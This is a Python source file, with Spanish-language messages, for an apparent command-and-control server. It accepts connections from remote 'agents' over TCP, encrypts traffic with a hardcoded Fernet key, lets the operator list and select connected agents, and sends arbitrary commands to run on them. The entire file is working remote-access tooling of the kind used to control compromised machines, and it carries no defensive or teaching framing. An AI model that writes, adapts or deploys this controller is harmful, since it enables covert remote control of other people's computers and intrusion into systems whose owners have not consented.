import socket
import threading
import struct
from cryptography.fernet import Fernet

KEY = b"KI47J7RwYu5guRVjg1sdMAT6JDCZB5eMWWB5zVuC5GE="
f = Fernet(KEY)

agents = []
total_agents = 0


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Conexión cerrada")
        data += chunk
    return data

def send_enc(sock, text):
    encrypted = f.encrypt(text.encode())
    sock.sendall(struct.pack(">I", len(encrypted)) + encrypted)

def recv_enc(sock):
    length = struct.unpack(">I", recv_exact(sock, 4))[0]
    return f.decrypt(recv_exact(sock, length)).decode()


class Agent(threading.Thread):
    def __init__(self, socket, address, id):
        threading.Thread.__init__(self)
        self.socket = socket
        self.address = address
        self.id = id
        self.signal = True
        self.daemon = True

    def run(self):
        while self.signal:
            try:
                output = recv_enc(self.socket)
                print(f"\n[Agent {self.id}] {output}")
                print(">> ", end="", flush=True)
            except:
                print(f"\n[!] Agent {self.id} ({self.address[0]}) desconectado")
                self.signal = False
                if self in agents:
                    agents.remove(self)
                break

    def send(self, cmd):
        send_enc(self.socket, cmd)


def accept_connections(server_socket):
    global total_agents
    while True:
        conn, addr = server_socket.accept()
        agent = Agent(conn, addr, total_agents)
        agents.append(agent)
        agent.start()
        print(f"\n[+] Agente {total_agents} conectado desde {addr[0]}:{addr[1]}")
        print(">> ", end="", flush=True)
        total_agents += 1


def list_agents():
    if not agents:
        print("[*] Sin agentes conectados")
        return
    for a in agents:
        status = "OK" if a.signal else "MUERTO"
        print(f"  [{a.id}] {a.address[0]}:{a.address[1]} — {status}")


def main():
    host = input("Host: ")
    port = int(input("Port: "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(5)
    print(f"[*] Escuchando en {host}:{port}")

    threading.Thread(target=accept_connections, args=(sock,), daemon=True).start()

    current_agent = None

    while True:
        cmd = input(">> ").strip()

        if not cmd:
            continue
        elif cmd == "help":
            print("  list       → agentes conectados")
            print("  use <id>   → seleccionar agente")
            print("  exit       → cerrar sesión con el agente")
            print("  <cmd>      → ejecutar en el agente seleccionado")
        elif cmd == "list":
            list_agents()
        elif cmd.startswith("use "):
            try:
                agent_id = int(cmd.split()[1])
                found = next((a for a in agents if a.id == agent_id), None)
                if found:
                    current_agent = found
                    print(f"[*] Agente {agent_id} seleccionado")
                else:
                    print(f"[!] ID {agent_id} no encontrado")
            except:
                print("[!] Uso: use <id>")
        elif cmd == "exit":
            if current_agent:
                current_agent.send("exit")
                current_agent = None
        else:
            if current_agent is None:
                print("[!] Ningún agente seleccionado")
            elif not current_agent.signal:
                print(f"[!] Agente {current_agent.id} desconectado")
                current_agent = None
            else:
                current_agent.send(cmd)


if __name__ == "__main__":
    main()